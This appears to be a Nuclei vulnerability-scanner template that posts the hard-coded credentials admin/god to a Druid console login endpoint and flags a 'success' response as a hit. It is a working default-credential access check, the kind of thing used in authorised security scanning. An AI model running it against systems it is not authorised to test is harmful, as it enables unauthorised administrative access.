
id: SRM-submitLogin-login

info:
  name: msk-template
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /adpweb/druid/submitLogin HTTP/1.1
        Accept:text/plain, */*; q=0.01
        Accept-Encoding:gzip, deflate, br
        Accept-Language:zh-CN,zh;q=0.9
        Connection:close
        Content-Length:37
        Content-Type:application/x-www-form-urlencoded; charset=UTF-8
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.155 Safari/537.36
        X-Requested-With:XMLHttpRequest

        loginUsername=admin&loginPassword=god

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && body=="success"